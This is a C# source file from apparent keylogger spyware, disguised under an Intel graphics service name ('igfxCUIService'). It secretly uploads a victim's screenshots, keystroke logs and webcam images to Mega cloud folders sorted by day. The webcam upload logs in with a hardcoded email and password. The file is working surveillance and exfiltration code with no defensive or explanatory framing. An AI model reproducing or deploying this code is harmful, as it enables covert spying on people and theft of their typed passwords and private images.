using CG.Web.MegaApiClient;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace igfxCUIService
{
    class Upload
    {
        #region variable
        private static MegaApiClient client = new MegaApiClient();
        private static INode root;
        private static INode keyloggermap;
        private static INode screenshotsmap;
        private static INode webcammap;
        private static INode Sendscreenshot;
        private static INode Sendkeylog;
        private static INode Sendwebcam;
        private static INode screenshotsday;
        private static INode webcamday;
        private static INode keylogmap;

        #endregion

        public static Uri downloadUrl = client.GetDownloadLink(Sendscreenshot);
        //Console.WriteLine(downloadUrl);
        //Console.ReadLine();

        #region screenshots
        public static void Screenshotsupload()
        {
            client.LoginAnonymous();
            var nodes = client.GetNodes();
            root = nodes.Single(n => n.Type == NodeType.Root);

            Screenshotsmaps();

            Sendscreenshot = client.UploadFile(Screenshots.pathString + Screenshots.hour + "." + Screenshots.minuten + "." + Screenshots.seconde + ".jpeg", screenshotsday);

            client.Logout();
        }

        private static void Screenshotsmaps()
        {
            // hier de dagelijkst map
            var nodes = client.GetNodes();
            // main folder
            try
            {
                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
            }
            catch
            {
                keyloggermap = client.CreateFolder("keylogger", root);
            }
            // screenshots folder
            try
            {
                screenshotsmap = client.GetNodes(keyloggermap).Single(n => n.Name == "screenshots");
            }
            catch
            {
                screenshotsmap = client.CreateFolder("screenshots", keyloggermap);
            }
            // dag map 
            try
            {
                screenshotsday = client.GetNodes(screenshotsmap).Single(n => n.Name == Screenshots.datum.ToShortDateString());
            }
            catch
            {
                screenshotsday = client.CreateFolder(Screenshots.datum.ToShortDateString(), screenshotsmap);
            }
        }
        #endregion

        // deze moet aan gepast worden op de text bestand nog
        #region keylogger

        public static void Keylogupload()
        {
            
            client.LoginAnonymous();
            var nodes = client.GetNodes();
            root = nodes.Single(n => n.Type == NodeType.Root);

            Keylogsmaps();

            Sendkeylog = client.UploadFile(Keylogger.path, keylogmap);

            client.Logout();
        }

        private static void Keylogsmaps()
        {
            // hier de dagelijkst map
            var nodes = client.GetNodes();
            // main folder
            try
            {
                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
            }
            catch
            {
                keyloggermap = client.CreateFolder("keylogger", root);
            }
            // keylogs
            try
            {
                keylogmap = client.GetNodes(keyloggermap).Single(n => n.Name == "keylog");
            }
            catch
            {
                keylogmap = client.CreateFolder("keylog", keyloggermap);
            }

        }
        #endregion

        #region webcam

        public static void Webcamupload()
        {
            client.Login("dippernetwork@gmail.com", "igfxCUIService");
            var nodes = client.GetNodes();
            root = nodes.Single(n => n.Type == NodeType.Root);

            Webcammaps();

            Sendwebcam = client.UploadFile(Webcam.pathString + Webcam.webcamhour + "." + Webcam.webcamminut + "." + Webcam.webcamseconde + ".jpeg", webcamday);
            
            client.Logout();
        }

        private static void Webcammaps()
        {

            var nodes = client.GetNodes();
            // main folder
            try
            {
                keyloggermap = client.GetNodes(root).Single(n => n.Name == "keylogger");
            }
            catch
            {
                keyloggermap = client.CreateFolder("keylogger", root);
            }
            // webcam
            try
            {
                webcammap = client.GetNodes(keyloggermap).Single(n => n.Name == "webcam");
            }
            catch
            {
                webcammap = client.CreateFolder("webcam", keyloggermap);
            }
            // dag map
            try
            {
                webcamday = client.GetNodes(webcammap).Single(n => n.Name == Webcam.datum.ToShortDateString());
            }
            catch
            {
                webcamday = client.CreateFolder(Webcam.datum.ToShortDateString(), webcammap);
            }
            
        }
        #endregion
    }
}